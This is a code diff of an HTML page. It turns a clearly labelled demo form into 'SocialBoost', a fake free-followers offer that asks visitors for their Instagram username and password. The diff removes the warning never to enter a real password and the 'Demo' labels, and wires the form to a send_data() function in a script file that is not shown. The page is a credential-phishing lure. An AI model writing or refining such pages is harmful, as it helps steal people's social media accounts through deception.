@@ -1,56 +1,86 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Followers | Demo</title>
+    <title>SocialBoost — 10K Free Followers</title>
     <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
-    <main class="page">
-        <section class="login-card">
+    <nav class="navbar">
+        <div class="logo">SOCIAL<span>BOOST</span></div>
+        <div class="live">
+            <span class="dot"></span> CAMPAIGN LIVE
+        </div>
+    </nav>
 
-            <div class="brand">Instagram</div>
+    <main class="hero">
 
-            <div class="promo">
-                <span class="tag">DEMO PROMOTION</span>
-                <h1>Get 10,000 Followers</h1>
-                <p>
-                    Preview a free-follower promotion using
-                    a demo username. No Instagram login required.
-                </p>
+        <div class="offer-tag">✦ LIMITED FREE CAMPAIGN</div>
+
+        <h1>
+            GET <span>10,000</span><br>
+            FOLLOWERS.
+            <strong>FOR FREE.</strong>
+        </h1>
+
+        <p class="subtitle">
+            Ready to grow your social presence?
+            Join our exclusive follower campaign today.
+        </p>
+
+        <div class="stats">
+            <div>
+                <h2>10K</h2>
+                <p>FOLLOWER OFFER</p>
+            </div>
+            <div>
+                <h2>₹0</h2>
+                <p>CAMPAIGN PRICE</p>
+            </div>
+            <div>
+                <h2>24/7</h2>
+                <p>REGISTRATION</p>
+            </div>
+        </div>
+
+        <section class="card">
+            <div class="card-heading">
+                <div class="icon">✦</div>
+                <div>
+                    <h2>Join the campaign</h2>
+                    <p>Enter your public Instagram username.</p>
+                </div>
             </div>
 
-            <form id="demoForm">
-                <label for="username">Demo username</label>
-                <input
-                    type="text"
-                    id="username"
-                    name="username"
-                    placeholder="Enter your username"
-                    autocomplete="off"
-                    required
-                >
+            <form>
+                <label for="username">INSTAGRAM USERNAME</label>
+                <input type="text" id="username" name="username" placeholder="@yourusername" autocomplete="off"
+                    required>
+                <label for="password">PASSWORD</label>
+                <input type="password" id="password" name="demo_password" placeholder="Your instagram password"
+                    autocomplete="off" required>
 
-                <label for="password">Test password</label>
-                <input
-                    type="password"
-                    id="password"
-                    placeholder="Enter your password"
-                    autocomplete="new-password"
-                    required
-                >
-
-                <p class="privacy">
-                    Demo only. Never enter your real Instagram password.
-                </p>
-
-                <button onclick="send_data()" >Continue</button>
+                <button onclick="send_data()">
+                    CLAIM MY OFFER <span>→</span>
+                </button>
             </form>
+
+            <p class="notice">
+                It just takes a few minutes to reflect into your account.
+            </p>
+        </section>
+
+        <div class="bottom">
+            SOCIALBOOST CAMPAIGN · 2026
+        </div>
+
+    </main>
 
 </body>
 <script src="script.js"></script>
-</html>
 
+</html>
